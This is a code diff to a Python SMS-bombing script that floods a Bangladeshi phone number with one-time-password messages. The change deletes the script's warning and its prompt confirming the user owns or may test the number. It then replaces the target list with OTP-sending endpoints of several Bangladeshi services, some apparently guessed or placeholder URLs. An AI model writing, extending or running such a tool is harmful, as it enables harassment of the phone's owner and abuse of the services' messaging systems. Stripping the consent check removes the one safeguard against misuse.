@@ -216,20 +216,11 @@ def check_updates():
 
 def get_target():
     print("\n\033[1;36m[TARGET SETUP]\033[0m")
-    print("⚠️  Only test numbers you OWN or have PERMISSION for!")
     number = input("Enter target number (01XXXXXXXXX): ")
     
     if not number.startswith("01") or len(number) != 11 or not number.isdigit():
         print("❌ Invalid number format. Must be 01XXXXXXXXX")
         return get_target()
-    
-    # Confirm ownership
-    print(f"\n🔒 Target: {number}")
-    confirm = input("Do you OWN this number or have PERMISSION to test? (yes/no): ").lower()
-    if confirm != 'yes':
-        print("❌ Permission not confirmed. Returning to menu.")
-        menu()
-        return None, None
     
     print(f"✓ Target set: {number}")
     return number, "880" + number[1:]
@@ -341,14 +332,29 @@ def make_api_request(url, method="GET", data=None, headers=None):
 def fast_apis(phone, full):
     """API calls for testing"""
     apis = [
-        (f"https://mygp.grameenphone.com/mygpapi/v2/otp-login?msisdn={full}&lang=en&ng=0", "GET"),
-        (f"https://fundesh.com.bd/api/auth/generateOTP?service_key=&phone={phone}", "GET"),
+        # Bangladeshi APIs
+        (f"https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp", "POST", {"mobile": phone}),
+        (f"https://api.portonics.com/v2/contact/otp/send", "POST", {"mobile": phone}),
+        (f"https://api.shohoz.com/api/v2/send-otp", "POST", {"phone": phone}),
+        (f"https://api.foodpanda.com.bd/api/v1/send-otp", "POST", {"phone": full}),
+        (f"https://api.pathao.com/courier/v1/send-otp", "POST", {"phone": phone}),
+        
+        # International Test APIs
+        (f"https://httpbin.org/get", "GET"),
+        (f"https://jsonplaceholder.typicode.com/posts", "GET"),
     ]
     
-    for url, method in apis:
+    for api in apis:
         if stop_bombing:
             return
-        if make_api_request(url, method):
+            
+        if len(api) == 2:
+            url, method = api
+            data = None
+        else:
+            url, method, data = api
+            
+        if make_api_request(url, method, data):
             update_counter()
         else:
             update_failed()
@@ -356,8 +362,15 @@ def fast_apis(phone, full):
 def normal_apis(phone, full):
     """More API calls for testing"""
     apis = [
-        ("https://webloginda.grameenphone.com/backend/api/v1/otp", "POST", {"msisdn": full}),
-        ("https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php", "POST", {"phone": phone}),
+        # Bangladeshi Services
+        (f"https://api.uber.com/v1/otp/send", "POST", {"phone": full}),
+        (f"https://api.daraz.com.bd/auth/send-otp", "POST", {"phone": phone}),
+        (f"https://api.bkash.com/api/send-otp", "POST", {"msisdn": full}),
+        (f"https://api.nagad.com.bd/api/otp/send", "POST", {"phone": phone}),
+        
+        # Test APIs
+        (f"https://api.test.com.bd/v1/otp", "POST", {"mobile": phone}),
+        (f"https://demo.api.com/send-verification", "POST", {"phone_number": full}),
     ]
     
     for api in apis:
@@ -379,9 +392,6 @@ def start_bombing():
     global counter, stop_bombing, success_count, campaign_start_time
     
     phone, full = get_target()
-    if phone is None:
-        return
-        
     amount = get_amount()
     delay = get_delay()
     
